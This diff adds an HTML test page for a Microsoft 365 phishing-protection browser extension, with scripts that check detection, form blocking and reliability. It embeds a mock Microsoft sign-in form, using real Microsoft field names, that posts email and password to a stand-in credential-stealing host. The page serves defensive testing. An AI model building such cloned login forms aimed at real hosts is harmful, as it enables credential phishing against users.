@@ -1,0 +1,363 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Microsoft 365 Protection - Reliability Test</title>
+    <style>
+        body {
+            font-family: system-ui, -apple-system, sans-serif;
+            max-width: 800px;
+            margin: 0 auto;
+            padding: 20px;
+            line-height: 1.6;
+        }
+        .test-section {
+            margin: 30px 0;
+            padding: 20px;
+            border: 1px solid #ddd;
+            border-radius: 8px;
+            background: #f9f9f9;
+        }
+        .test-button {
+            background: #1976d2;
+            color: white;
+            border: none;
+            padding: 12px 24px;
+            border-radius: 4px;
+            cursor: pointer;
+            margin: 8px;
+            font-size: 14px;
+        }
+        .test-button:hover {
+            background: #1565c0;
+        }
+        .status {
+            margin: 10px 0;
+            padding: 10px;
+            border-radius: 4px;
+            font-weight: 500;
+        }
+        .status.success {
+            background: #e8f5e8;
+            color: #2e7d32;
+            border: 1px solid #4caf50;
+        }
+        .status.error {
+            background: #ffebee;
+            color: #c62828;
+            border: 1px solid #f44336;
+        }
+        .status.info {
+            background: #e3f2fd;
+            color: #1565c0;
+            border: 1px solid #2196f3;
+        }
+        .fake-login-form {
+            background: white;
+            padding: 20px;
+            border: 1px solid #ccc;
+            border-radius: 8px;
+            margin: 20px 0;
+        }
+        .fake-login-form input {
+            width: 100%;
+            padding: 12px;
+            margin: 8px 0;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+            font-size: 14px;
+        }
+        .fake-login-form button {
+            background: #0078d4;
+            color: white;
+            border: none;
+            padding: 12px 24px;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 14px;
+        }
+    </style>
+</head>
+<body>
+    <h1>🛡️ Microsoft 365 Protection - Reliability Test</h1>
+    
+    <div class="test-section">
+        <h2>Extension Status</h2>
+        <p>This page tests the reliability of the Microsoft 365 phishing protection extension.</p>
+        <div id="extension-status" class="status info">Checking extension status...</div>
+        <button class="test-button" onclick="checkExtensionStatus()">Check Extension Status</button>
+        <button class="test-button" onclick="testDetectionEngine()">Test Detection Engine</button>
+    </div>
+
+    <div class="test-section">
+        <h2>Phishing Detection Test</h2>
+        <p>This simulates a phishing page with Microsoft login elements on a non-Microsoft domain.</p>
+        
+        <div class="fake-login-form">
+            <h3>Sign in to your account</h3>
+            <p>Microsoft 365</p>
+            
+            <form action="https://evil-phishing-site.com/steal-credentials" method="POST">
+                <input type="email" name="loginfmt" placeholder="Email, phone, or Skype" required>
+                <input type="password" name="passwd" placeholder="Password" required>
+                <input type="hidden" name="idPartnerPL" value="fake">
+                <button type="submit" id="idSIButton9">Sign in</button>
+            </form>
+            
+            <p><small>Can't access your account?</small></p>
+        </div>
+        
+        <div id="detection-status" class="status info">Detection status will appear here...</div>
+        <button class="test-button" onclick="triggerDetection()">Trigger Detection</button>
+        <button class="test-button" onclick="testFormSubmission()">Test Form Submission</button>
+    </div>
+
+    <div class="test-section">
+        <h2>Performance Test</h2>
+        <p>Test the reliability and performance of the detection system.</p>
+        <div id="performance-results" class="status info">Click "Run Performance Test" to start...</div>
+        <button class="test-button" onclick="runPerformanceTest()">Run Performance Test</button>
+        <button class="test-button" onclick="runReliabilityTest()">Run Reliability Test (10 iterations)</button>
+    </div>
+
+    <div class="test-section">
+        <h2>Test Results</h2>
+        <div id="test-results"></div>
+        <button class="test-button" onclick="clearResults()">Clear Results</button>
+    </div>
+
+    <script>
+        let testResults = [];
+        
+        function updateStatus(elementId, message, type = 'info') {
+            const element = document.getElementById(elementId);
+            if (element) {
+                element.textContent = message;
+                element.className = `status ${type}`;
+            }
+        }
+        
+        function addTestResult(test, result, success) {
+            testResults.push({
+                test: test,
+                result: result,
+                success: success,
+                timestamp: new Date().toISOString()
+            });
+            updateTestResults();
+        }
+        
+        function updateTestResults() {
+            const resultsDiv = document.getElementById('test-results');
+            if (!resultsDiv) return;
+            
+            resultsDiv.innerHTML = testResults.map(result => `
+                <div class="status ${result.success ? 'success' : 'error'}">
+                    <strong>${result.test}</strong>: ${result.result}
+                    <br><small>${result.timestamp}</small>
+                </div>
+            `).join('');
+        }
+        
+        function clearResults() {
+            testResults = [];
+            updateTestResults();
+        }
+        
+        async function checkExtensionStatus() {
+            try {
+                updateStatus('extension-status', 'Checking extension...', 'info');
+                
+                // Check if extension is loaded
+                if (typeof chrome !== 'undefined' && chrome.runtime && chrome.runtime.id) {
+                    updateStatus('extension-status', 'Extension loaded successfully', 'success');
+                    addTestResult('Extension Status', 'Extension is loaded and active', true);
+                } else {
+                    updateStatus('extension-status', 'Extension not detected', 'error');
+                    addTestResult('Extension Status', 'Extension not loaded or not active', false);
+                }
+            } catch (error) {
+                updateStatus('extension-status', `Error: ${error.message}`, 'error');
+                addTestResult('Extension Status', `Error: ${error.message}`, false);
+            }
+        }
+        
+        async function testDetectionEngine() {
+            try {
+                updateStatus('extension-status', 'Testing detection engine...', 'info');
+                
+                // Check if protection is active
+                const protectionElements = document.querySelectorAll('[id^="ms365-"]');
+                
+                if (protectionElements.length > 0) {
+                    updateStatus('extension-status', 'Detection engine is working - protection elements found', 'success');
+                    addTestResult('Detection Engine', `Found ${protectionElements.length} protection elements`, true);
+                } else {
+                    updateStatus('extension-status', 'Detection engine may not be active', 'error');
+                    addTestResult('Detection Engine', 'No protection elements found', false);
+                }
+            } catch (error) {
+                updateStatus('extension-status', `Detection test error: ${error.message}`, 'error');
+                addTestResult('Detection Engine', `Error: ${error.message}`, false);
+            }
+        }
+        
+        function triggerDetection() {
+            try {
+                updateStatus('detection-status', 'Triggering detection...', 'info');
+                
+                // Force a page re-scan by dispatching a custom event
+                const event = new CustomEvent('ms365-force-scan');
+                document.dispatchEvent(event);
+                
+                setTimeout(() => {
+                    const protectionElements = document.querySelectorAll('[id^="ms365-"]');
+                    if (protectionElements.length > 0) {
+                        updateStatus('detection-status', `Detection triggered - ${protectionElements.length} protection elements active`, 'success');
+                        addTestResult('Manual Detection Trigger', `${protectionElements.length} elements found`, true);
+                    } else {
+                        updateStatus('detection-status', 'Detection triggered but no protection elements found', 'error');
+                        addTestResult('Manual Detection Trigger', 'No protection elements found', false);
+                    }
+                }, 500);
+                
+            } catch (error) {
+                updateStatus('detection-status', `Trigger error: ${error.message}`, 'error');
+                addTestResult('Manual Detection Trigger', `Error: ${error.message}`, false);
+            }
+        }
+        
+        function testFormSubmission() {
+            try {
+                updateStatus('detection-status', 'Testing form submission blocking...', 'info');
+                
+                const form = document.querySelector('form');
+                if (form) {
+                    // Try to submit the form
+                    const submitEvent = new Event('submit', { bubbles: true, cancelable: true });
+                    const prevented = !form.dispatchEvent(submitEvent);
+                    
+                    if (prevented) {
+                        updateStatus('detection-status', 'Form submission successfully blocked', 'success');
+                        addTestResult('Form Submission Block', 'Form submission was prevented', true);
+                    } else {
+                        updateStatus('detection-status', 'Form submission was NOT blocked', 'error');
+                        addTestResult('Form Submission Block', 'Form submission was not prevented', false);
+                    }
+                } else {
+                    updateStatus('detection-status', 'No form found to test', 'error');
+                    addTestResult('Form Submission Block', 'No form found', false);
+                }
+            } catch (error) {
+                updateStatus('detection-status', `Form test error: ${error.message}`, 'error');
+                addTestResult('Form Submission Block', `Error: ${error.message}`, false);
+            }
+        }
+        
+        async function runPerformanceTest() {
+            try {
+                updateStatus('performance-results', 'Running performance test...', 'info');
+                
+                const startTime = performance.now();
+                
+                // Simulate multiple detection runs
+                for (let i = 0; i < 5; i++) {
+                    triggerDetection();
+                    await new Promise(resolve => setTimeout(resolve, 100));
+                }
+                
+                const endTime = performance.now();
+                const totalTime = endTime - startTime;
+                const avgTime = totalTime / 5;
+                
+                updateStatus('performance-results', 
+                    `Performance test completed: ${totalTime.toFixed(2)}ms total, ${avgTime.toFixed(2)}ms average`, 
+                    'success');
+                addTestResult('Performance Test', `${avgTime.toFixed(2)}ms average detection time`, true);
+                
+            } catch (error) {
+                updateStatus('performance-results', `Performance test error: ${error.message}`, 'error');
+                addTestResult('Performance Test', `Error: ${error.message}`, false);
+            }
+        }
+        
+        async function runReliabilityTest() {
+            try {
+                updateStatus('performance-results', 'Running reliability test (10 iterations)...', 'info');
+                
+                let successCount = 0;
+                const totalIterations = 10;
+                
+                for (let i = 0; i < totalIterations; i++) {
+                    try {
+                        // Clear any existing protection elements
+                        document.querySelectorAll('[id^="ms365-"]').forEach(el => el.remove());
+                        
+                        // Wait a moment
+                        await new Promise(resolve => setTimeout(resolve, 200));
+                        
+                        // Trigger detection
+                        triggerDetection();
+                        
+                        // Wait for detection to complete
+                        await new Promise(resolve => setTimeout(resolve, 300));
+                        
+                        // Check if protection was applied
+                        const protectionElements = document.querySelectorAll('[id^="ms365-"]');
+                        if (protectionElements.length > 0) {
+                            successCount++;
+                        }
+                        
+                        updateStatus('performance-results', 
+                            `Reliability test progress: ${i + 1}/${totalIterations} (${successCount} successes)`, 
+                            'info');
+                            
+                    } catch (iterationError) {
+                        console.warn(`Reliability test iteration ${i + 1} failed:`, iterationError);
+                    }
+                }
+                
+                const successRate = (successCount / totalIterations) * 100;
+                const resultType = successRate >= 90 ? 'success' : successRate >= 70 ? 'info' : 'error';
+                
+                updateStatus('performance-results', 
+                    `Reliability test completed: ${successCount}/${totalIterations} successes (${successRate.toFixed(1)}%)`, 
+                    resultType);
+                addTestResult('Reliability Test', `${successRate.toFixed(1)}% success rate (${successCount}/${totalIterations})`, successRate >= 70);
+                
+            } catch (error) {
+                updateStatus('performance-results', `Reliability test error: ${error.message}`, 'error');
+                addTestResult('Reliability Test', `Error: ${error.message}`, false);
+            }
+        }
+        
+        // Auto-run initial tests when page loads
+        window.addEventListener('load', () => {
+            setTimeout(() => {
+                checkExtensionStatus();
+                setTimeout(() => {
+                    testDetectionEngine();
+                }, 1000);
+            }, 500);
+        });
+        
+        // Monitor for protection elements being added
+        const observer = new MutationObserver((mutations) => {
+            mutations.forEach((mutation) => {
+                mutation.addedNodes.forEach((node) => {
+                    if (node.nodeType === Node.ELEMENT_NODE && node.id && node.id.startsWith('ms365-')) {
+                        console.log('Protection element added:', node.id);
+                        addTestResult('Protection Element Added', `Element: ${node.id}`, true);
+                    }
+                });
+            });
+        });
+        
+        observer.observe(document.documentElement, {
+            childList: true,
+            subtree: true
+        });
+    </script>
+</body>
+</html>
